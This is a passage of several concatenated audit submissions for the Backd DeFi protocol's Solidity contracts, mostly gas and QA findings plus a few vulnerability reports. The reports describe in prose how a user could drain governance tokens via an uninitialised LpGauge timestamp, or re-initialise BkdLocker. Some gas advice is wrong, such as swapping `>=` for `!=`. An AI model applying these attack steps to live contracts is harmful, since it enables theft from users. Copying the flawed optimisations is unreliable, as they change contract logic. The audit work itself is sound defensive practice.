difficult to use dynamic information in them. Custom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries). ROLEmanager.sol 28:        require(hasRole(Roles.GOVERNANCE, msg.sender), Error.UNAUTHORIZED_ACCESS); 46:        require(getRoleMemberCount(Roles.GOVERNANCE) > 1, Error.CANNOT_REVOKE_ROLE); 112:        require(role != Roles.GOVERNANCE, Error.CANNOT_REVOKE_ROLE); 113:        require(hasRole(role, account), Error.INVALID_ARGUMENT); https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L104 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L125 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L140 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/Minter.sol#L152  —----------------------------------------------  In a require statement it saves gas to make !=0 .Uint variable is anything greater or equal to zero it saves gas to make != 0   https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L91-L94 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L104 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L140   ++i costs less gas compared to i++ or i += 1 ++i costs less gas compared to i++ or i += 1 for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled. i++ increments i and returns the initial value of i. Which means: uint i = 1; i++; // == 1 but i == 2 But ++i returns the actual incremented value: uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable In the first case, the compiler has to create a temporary variable (when used) for returning 1 instead of 2   epoch++  Change to  ++epoch  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L59  Same thing with minus  - -  Use  – i instead of putting multiple assignment to i  i = i - 1; https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L140  Uint48 after a bool and bool fills the slot of zeros so uint 48 is waste of gas and it will be cheaper to use uint and uint48 like a mix to make it one slot or after the address because address is 160 bits. If you want the bool then make uint48  into uint256 to save gas. https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L32 Order: Address -one slot  Bool -one slot Uint48-one slot  New Order: Address -160  Uint48-48 1 slot with 48 remaining  Bool -1slot  Saving:20_000 gas  —------------------------------------------ Make variable uninitialized to save gas for sstore 20_000 and memory 3 gas  Because by default its already zero  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L64 —------------------------------------ Reduce the size of error messages (Long revert Strings) Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met. Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.   1 byte for each  character   https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/Minter.sol#L152 In the EVM, there is no opcode for >= or <=. When using greater than or equal, two operations are performed: > and =. Using strict comparison operators hence saves gas require(delay >= _MIN_DELAY, Error.DELAY_TOO_SHORT);  Instead use  Delay != _MIN_DELAY  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L29 —------------------------------- Events with 3 fields make indexed to save gas https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/interfaces/vendor/ICvxLocker.sol#L51-L53  Dead code it wastes gas in the code  storing type  It will never call the approve function  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L63 
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmConvexGauge.sol#L107-L111 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmConvexGauge.sol#L129-L134   # Vulnerability details  ## Impact The view functions used for a user to check their claimable rewards vary in their implementation. This can cause users to believe they are due X amount but will receive Y.  ## Proof of Concept If the `inflationRecipient` is set, then `poolStakedIntegral` will be incremented in `claimableRewards()` but not in any other function like `allClaimableRewards()` or `poolCheckpoint()`.  If a user calls `claimableRewards()` after the `inflationRepient` has been set, `claimableRewards()` will return a larger value than `allClaimableRewards()` or the amount actually returned by `claimRewards()`.  ## Tools Used Manual review  ## Recommended Mitigation Steps To make the logic consistent, `claimableRewards()` needs `if (inflationRecipient == address(0))` added to it.  
No check on address zero can cause logic errors and lost of funds  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L221 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L221 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L52   Add more comments on burnFees function and natspec comments  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L35   Very hard to read code and  its very packed together.its so compacted that my vscode visual extension cant read if its state or memory variable  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L36-L48 —-------------------------------------- if (IERC20(token).allowance(address(this), spender) > 0) return;        IERC20(token).safeApprove(spender, type(uint256).max); Just space it out to make it more readable  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L63  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L52-L66  if allowance is more then zero then  it will return nothing and first return something to  help  a function that calls this function  if this allowance is more than zero it will return nothing and it you cant approve anything  its dead code 
## G01 - Comparison ```> 0``` is less gas efficient than ```!= 0``` with ```uint256``` in ```require``` statement with optimizer  ```solidity protocol/contracts/BkdLocker.sol:91 require(amount > 0, Error.INVALID_AMOUNT); protocol/contracts/BkdLocker.sol:92 require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);  protocol/contracts/BkdLocker.sol:137    require(length > 0, "No entries"); protocol/contracts/tokenomics/AmmGauge.sol:104  require(amount > 0, Error.INVALID_AMOUNT);  protocol/contracts/tokenomics/AmmGauge.sol:125  require(amount > 0, Error.INVALID_AMOUNT);  protocol/contracts/tokenomics/KeeperGauge.sol:140   require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); protocol/contracts/tokenomics/VestedEscrow.sol:84   require(unallocatedSupply > 0, "No reward tokens in contract");  ```  ## G02 - Too long revert string  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition has been met.  ```solidity protocol/contracts/tokenomics/Minter.sol:152    "Maximum non-inflation amount exceeded."  ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L152  ## G03 - ```unchecked``` block can be used for gas efficiency of the expression that can't overflow/underflow  Check comments ```soldity  protocol/contracts/utils/CvxMintAmount.sol:21   uint256 currentCliff = cvxTotalSupply / _CLIFF_SIZE; // Could be unchecked since _CLIFF_SIZE is non-zero constant  protocol/contracts/zaps/PoolMigrationZap.sol:22 for (uint256 i; i < newPools_.length; ++i) { // Increment in for loop can be unchecked, it would never overflow with type uint256 protocol/contracts/tokenomics/VestedEscrow.sol:155  uint256 elapsed = _time - startTime; // Could be unchecked due to check on L152 protocol/contracts/BkdLocker.sol:140    i = i - 1; // Could be unchecked due to check on L139 protocol/contracts/BkdLocker.sol:144    stashedWithdraws[i] = stashedWithdraws[stashedWithdraws.length - 1]; //  Could be unchecked since length of stashedWithdraws decrease in sync with counter "i" and loop will end after length 1 ```  ## G04 - Caching storage values in memory  Variables that are read multiple times in a code block can be cached and re-used instead of reading from storage to save gas.  ```solidity protocol/contracts/StakerVault.sol:338  uint256 staked = IERC20(token).balanceOf(address(this)) - oldBal; // token 5 SLOADs ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L322-L349 ```solidity protocol/contracts/StakerVault.sol:383  uint256 unstaked = oldBal.uncheckedSub(IERC20(token).balanceOf(address(this))); // token 4 SLOADs ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L359-L398  ## G05 - Redundant code  The following lines don't change the value of the variable since it's uint256: ```solidity protocol/contracts/tokenomics/InflationManager.sol:575  totalKeeperPoolWeight = totalKeeperPoolWeight > 0 ? totalKeeperPoolWeight : 0;  protocol/contracts/tokenomics/InflationManager.sol:589  totalLpPoolWeight = totalLpPoolWeight > 0 ? totalLpPoolWeight : 0;  protocol/contracts/tokenomics/InflationManager.sol:602  totalAmmTokenWeight = totalAmmTokenWeight > 0 ? totalAmmTokenWeight : 0; ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L575 
 ## N01 - Typos  ``` protocol/contracts/BkdLocker.sol:173   * @dev This does not invlude the gov. tokens queued for withdrawal. // typo - include protocol/contracts/tokenomics/FeeBurner.sol:29  event Burned(address targetLpToken, uint256 amountBurned); // Emmited after a successfull burn to target lp token //  typo - successful protocol/contracts/tokenomics/FeeBurner.sol:84  // Transfering LP tokens back to sender // typo -Transferring ```  ## N02 - Open TODO  ```solidity protocol/contracts/tokenomics/InflationManager.sol:532  //TOOD: See if this is still needed somewhere ```  ## N03 - More readable numbers  Numbers like 100000000 could be set 100_000_000 for more readability:  ```solidity     uint256 private constant _CLIFF_SIZE = 100000 * 1e18; //new cliff every 100,000 tokens      uint256 private constant _CLIFF_COUNT = 1000; // 1,000 cliffs     uint256 private constant _MAX_SUPPLY = 100000000 * 1e18; //100 mil max supply      ``` 
### FINDINGS ### TYPOS  File: BkdLocker.sol [line 732](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L173) ``` * @dev This does not invlude the gov. tokens queued for withdrawal. ``` **invlude** Instead of **include**  File: FeeBurner.sol [line 35](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L35) ``` receive() external payable {} // Recieve function for withdrawing from Backd ETH Pool ``` **Recieve** instead of **Receive**  File:AddressProvider.sol  [line 237](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L237) ```  * @param key Key to feeze   ``` **feeze** Instead of **freeze**   ### NATSPEC is Incomplete  File: AddressProvider.sol [line 77-87 ](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L77-L87) ```    /**      * @notice Adds action.      * @param action Address of action to add.      */     function addAction(address action) external override onlyGovernance returns (bool) {         bool result = _actions.add(action);         if (result) {             emit ActionListed(action);         }         return result;     } ``` Missing @return    File:AddressProvider.sol [line 172-178](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L172-L178) ```     /**      * @notice Returns the address for the given key      */     function getAddress(bytes32 key) public view override returns (address) {         require(_addressKeyMetas.contains(key), Error.ADDRESS_DOES_NOT_EXIST);         return currentAddresses[key];     } ``` Missing @param key   File:AddressProvider.sol [line 180-187](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L180-L187) ```     /**      * @notice Returns the address for the given key      * @dev if `checkExists` is true, it will fail if the key does not exist      */     function getAddress(bytes32 key, bool checkExists) public view override returns (address) {         require(!checkExists || _addressKeyMetas.contains(key), Error.ADDRESS_DOES_NOT_EXIST);         return currentAddresses[key];     } ``` Missing @param key   File:AddressProvider.sol  [line 264-268](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L264-L268) ```    /**      * @notice Execute update of `key`      * @return New address.      */     function executeAddress(bytes32 key) external override returns (address) { ``` Missing @param key   File:AddressProvider.sol [line 365-369](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L365-L369) ```    /**      * @notice returns the pool at the given index      */     function getPoolAtIndex(uint256 index) external view override returns (address) {         return _tokenToPools.valueAt(index); ``` Missing @param index   File: StakerVault.sol [line 93-98](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L93-L98) ```    /**      * @notice Registers an address as a strategy to be excluded from token accumulation.      * @dev This should be used if a strategy deposits into a stakerVault and should not get gov. tokens.      * @return `true` if success.      */     function addStrategy(address strategy) external override returns (bool) { ``` Missing @param strategy    ### Inconsistent use/impementation of the uncheck block   Throught the contracts  a library is being used to handle the arithmetic operations that can never over/underflow. The library **UncheckedMath.sol** has been used in all for loops to wrap the the loop increment  using the function **uncheckedInc()** as shown below  File: StakerVault.sol [line 256-263](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L256-L263) ```     function getStakedByActions() external view override returns (uint256) {         address[] memory actions = addressProvider.allActions();         uint256 total;         for (uint256 i; i < actions.length; i = i.uncheckedInc()) {             total += balances[actions[i]];         }         return total;     } ```  The above usage of the library **UncheckedMath.sol** and the **uncheckedInc()** function has been implemented in all contracts apart from the following.   File:PoolMigrationZap.sol  [line 38-45](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L38-L45) ```    function migrateAll(address[] calldata oldPoolAddresses_) external override {         for (uint256 i; i < oldPoolAddresses_.length; ) {             migrate(oldPoolAddresses_[i]);             unchecked {                 ++i;             }         }     } ```  The above uses the unchecked{} block directly rather than follow the same pattern with other contracts.  I would suggest we stick to the same approach in handling the arithmetics that can never over/underflow.
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L115-L119 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L326-L328   # Vulnerability details  ## Impact A user can claim all of the available governance tokens or prevent any rewards from being claimed in `LpGauge.sol` if sufficient time is left between deploying the contract and initialising it in the `StakerVault.sol` contract by calling `initalizeLPGauge()` OR if a new `LPGauge` contract is deployed and added to `StakerVault` using `prepareLPGauge`.  Inside `LPGauge.sol` when calling `_poolCheckPoint()`, the `lastUpdated` variable is not initalised so defaults to a value of `0`, therefore if the user has managed to stake tokens in the `StakerVault` then the calculated `poolStakedIntegral` will be very large (as block.timestamp is very large). Therefore a user can mint most current available governance tokens for themselves when they claim their rewards (or prevent any governance tokens from being claimed).  ## Proof of Concept 1. LP Gauge and StakerVault contracts are deployed 2. Before the `initializeLpGauge()`, user A will stake 1 token with `stakeFor()` thereby increasing `_poolTotalStaked` by 1. As the `lpgauge` address is equal to the zero address, `_userCheckPoint()` will not be called and `poolLastUpdate` will remain at 0. 3. The user can then directly call `_userCheckPoint()` and be allocated a very large number of shares. This works because `poolLastUpdate` is 0 but the staked amount in the vault is larger than 0 4. Once `initializeLPGauge()` is called, the user can then call `claimRewards()` and receive a very large portion of tokens or if `poolStakedIntegral` exceeds the mint limit set by `Minter.sol` then no one else can claim governance tokens from the lpGauge.  OR 5. A new LP Gauge contract is deployed and added to the vault using `prepareGauge()`. Follow steps 2 to 4.  ## Tools Used Manual audit ## Recommended Mitigation Steps Initialise `poolLastUpdate` in the constructor  
## FINDINGS  ## Comparisons: != is more efficient than > in require  != 0 costs less gas compared to > 0 for unsigned integers in require statements with the optimizer enabled (6 gas)  Proof: While it may seem that > 0 is cheaper than !=, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a require statement, this will save gas. You can see this [tweet](https://twitter.com/gzeon/status/1485428085885640706) for more proofs:   I suggest changing > 0 with != 0 here:  File: BkdLocker.sol [line 91](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L91) ``` require(amount > 0, Error.INVALID_AMOUNT); ``` Since **amount** is a uint256, it means it's value can never be less than 0 so the test > 0 is essentially testing that amount is not equal to 0 a  **Other Instances** File: BkdLocker.sol [line 92](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L92) ``` require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS); ```   File: BkdLocker.sol [line 137](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L137) ``` require(length > 0, "No entries"); ```  File: VestedEscrow.sol [line 84](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L84) ``` require(unallocatedSupply > 0, "No reward tokens in contract"); ``` File: AmmGauge.sol [line 104](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L104) ``` require(amount > 0, Error.INVALID_AMOUNT); ``` File: AmmGauge.sol [line 125](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L125) ```         require(amount > 0, Error.INVALID_AMOUNT); ```  ## use shorter revert strings(less than 32 bytes) or use custom errors  File: Minter.sol [line 150](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L150)  ```require(             issuedNonInflationSupply + amount <= nonInflationDistribution,             "Maximum non-inflation amount exceeded."         ); ```  ## Cache the length of arrays in loops Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack. Caching the array length in the stack saves around 3 gas per iteration. Therefore, it’s possible to save a significant amount of gas  especially when the length is significantly big.  Here, I suggest storing the array’s length in a variable before the for-loop, and use it instead:   File:StakerVault.sol [line 259](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L259)   ``` function getStakedByActions() external view override returns (uint256) {         address[] memory actions = addressProvider.allActions();         uint256 total;         for (uint256 i; i < actions.length; i = i.uncheckedInc()) {             total += balances[actions[i]];         }         return total;     } ``` The line to modify:  ``` for (uint256 i; i < actions.length; i = i.uncheckedInc()) { ```   **Other Instance to change** File: RewardHandler.sol [line 35-55](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L35-L55)  ```    function burnFees() external override {         IBkdLocker bkdLocker = IBkdLocker(addressProvider.getBKDLocker());         IFeeBurner feeBurner = addressProvider.getFeeBurner();         address targetLpToken = bkdLocker.rewardToken();         address[] memory pools = addressProvider.allPools();         uint256 ethBalance = address(this).balance;         address[] memory tokens = new address[](pools.length);         for (uint256 i; i < pools.length; i = i.uncheckedInc()) {             ILiquidityPool pool = ILiquidityPool(pools[i]);             address underlying = pool.getUnderlying();             if (underlying != address(0)) {                 _approve(underlying, address(feeBurner));             }             tokens[i] = underlying;         }         feeBurner.burnToTarget{value: ethBalance}(tokens, targetLpToken);         uint256 burnedAmount = IERC20(targetLpToken).balanceOf(address(this));         IERC20(targetLpToken).safeApprove(address(bkdLocker), burnedAmount);         bkdLocker.depositFees(burnedAmount);         emit Burned(targetLpToken, burnedAmount);     } ``` The specific line to change [here](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L42) ```        for (uint256 i; i < pools.length; i = i.uncheckedInc()) { ```   File: PoolMigrationZap.sol [line 22](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22) ```         for (uint256 i; i < newPools_.length; ++i) { ```   Something similar to my propasal **was implemented on this contract as shown in the function below.** File:Controller.sol [line 121-130](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L121-L130) ```    function getTotalEthRequiredForGas(address payer) external view override returns (uint256) {         // solhint-disable-previous-line ordering         uint256 totalEthRequired;         address[] memory actions = addressProvider.allActions();         uint256 numActions = actions.length;         for (uint256 i; i < numActions; i = i.uncheckedInc()) {             totalEthRequired += IAction(actions[i]).getEthRequiredForGas(payer);         }         return totalEthRequired;     } ``` Note the array length was cached to **numActions**   **Also Implemented on here:** File:InflationManager.sol [line 96-100](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L96-L100) ```address[] memory liquidityPools = addressProvider.allPools();         uint256 length = liquidityPools.length;         for (uint256 i; i < length; i = i.uncheckedInc()) {             _removeKeeperGauge(address(liquidityPools[i]));         } ```  ### Using unchecked blocks to save gas Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block: [see official docs](https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic)  File: VestedEscrow.sol [line 63](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L63) ```         totalTime = endtime_ - starttime_; ``` The above line cannot overflow due to the check on the line shown below File: VestedEscrow.sol [line 58](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L58) ```         require(endtime_ > starttime_, "end must be greater"); ``` In this contract we have a library that can aid in having unchecked arithmetics that is **libraries/UncheckedMath.sol** imported on  [line 21](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L21)  With the help of this library we can modify our arithmetic to   ```         totalTime = endtime_.uncheckedSub(starttime_); ``` A similar approach was implemented in the file below. File: StakerVault.sol [lines 229-230](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L229-L230)  ```         if (actionLockedBalances[account] > amount) {             actionLockedBalances[account] = actionLockedBalances[account].uncheckedSub(amount); ```   **Other Instances to modify** File:  VestedEscrow.sol [line 155](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L155) ```         uint256 elapsed = _time - startTime; ``` The above cannot underflow due to the check on [line 152](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L152) which ensures that time is greater than startTime ```         if (_time < startTime) {             return 0;         }         uint256 elapsed = _time - startTime;         return Math.min((locked * elapsed) / totalTime, locked); ```  This  ```uint256 elapsed = _time - startTime;```  should be changed to  ```uint256 elapsed = _time.uncheckedSub(startTime);```    File: StakerVault.sol  [line 124](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L124)  ```         balances[msg.sender] -= amount; ```  The above line cannot underflow due the check on [line 113](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L113) ```         require(balances[msg.sender] >= amount, Error.INSUFFICIENT_BALANCE); ``` The checks ensures that **balances[msg.sender]** is greater or equal to **amount** therefore balances[msg.sender]-amount will never underflow.   
## Caching  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/access/RoleManager.sol#L82 cache the value of `roles.length` before starting the loop to save gas  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L144 Use variable `length` instead of `stashedWithdraws.length` to save 1 SLOAD  ## !=0 is cheaper than >0 inside require staements https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L91 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L92 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L137 
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L53-L64   # Vulnerability details  ## Impact function `initialize()` of `BkdLocker` suppose to be called one time and contract initialize one time. but if it's called by `startBoost=0` then it's possible to call it again with different values for other parameters. there are some logics based on the values function `initilize()` sets which is in calculating boost and withdraw delay. by initializing multiple times different users get different values for those logics and because rewards are distributed based on boosts so those logics will be wrong too.  ## Proof of Concept This is `initiliaze()` code in `BkdLocker`: ```     function initialize(         uint256 startBoost,         uint256 maxBoost,         uint256 increasePeriod,         uint256 withdrawDelay     ) external override onlyGovernance {         require(currentUInts256[_START_BOOST] == 0, Error.CONTRACT_INITIALIZED);         _setConfig(_START_BOOST, startBoost);         _setConfig(_MAX_BOOST, maxBoost);         _setConfig(_INCREASE_PERIOD, increasePeriod);         _setConfig(_WITHDRAW_DELAY, withdrawDelay);     } ``` As you can see it checks the initialization statue by `currentUInts256[_START_BOOST]`'s value but it's not correct way to do and initializer can set `currentUInts256[_START_BOOST]` value as `0` and set other parameters values and call this function multiple times with different values for `_MAX_BOOST` and `_INCREASE_PERIOD` and `_WITHDRAW_DELAY`. setting different values for those parameters can cause different calculation in `computeNewBoost()` and `prepareUnlock()`. function `computeNewBoost()` is used to calculate users boost parameters which is used on reward distribution. so by changing `_MAX_BOOST` the rewards will be distributed wrongly between old users and new users.  ## Tools Used VIM  ## Recommended Mitigation Steps add some other variable to check the status of initialization of contract.   
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L62-L76   # Vulnerability details  ## Impact Unclaimed fees from pool will be stuck  ## Proof of Concept When delisting a pool the pool's reference is removed from address provider:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L63  Burning fees calls a dynamic list of all pools which no longer contains the delisted pool:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L39  Since the list no longer contains the pool those fees will not be processed and will remain stuck in the contract   ## Tools Used  ## Recommended Mitigation Steps Call burnFees() before delisting a pool  
# ISSUE LIST  ## C4-001 : Missing events for only functions that change critical parameters - Non Critical ## C4-002 : Critical changes should use two-step procedure - Non Critical ## C4-003 : Missing zero-address/values check in the constructor - Low ## C4-004 : The Contract Should approve(0) first ## C4-005 : Incompatibility With Rebasing/Deflationary/Inflationary tokens ## C4-006 : Contract should have pause/unpause functionality ## C4-007 : Front-runnable Initializers     # ISSUES  # C4-001 : Missing events for only functions that change critical parameters  ## Impact - Non critical  The afunctions that change critical parameters should emit events. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages.  Missing events and timelocks do not promote transparency and if such changes immediately affect users’ perception of fairness or trustworthiness, they could exit the protocol causing a reduction in liquidity which could negatively impact protocol TVL and reputation.   ## Proof of Concept  1. Navigate to the following contract.  ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L86 ```  See similar High-severity H03 finding OpenZeppelin’s Audit of Audius (https://blog.openzeppelin.com/audius-contracts-audit/#high) and Medium-severity M01 finding OpenZeppelin’s Audit of UMA Phase 4 (https://blog.openzeppelin.com/uma-audit-phase-4/)  ## Tools Used  None  ## Recommended Mitigation Steps  Add events to all functions that change critical parameters.   # C4-002 : Critical changes should use two-step procedure  ## Impact - NON CRITICAL  The critical procedures should be two step process.  ## Proof of Concept  1. Navigate to the following contract.  ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L86 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/access/RoleManager.sol#L50 ```  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Lack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.  # C4-003 : # Missing zero-address&values check in the constructor  ## Impact  Missing checks for zero-addresses&values may lead to infunctional protocol, if the variable addresses are updated incorrectly.  ## 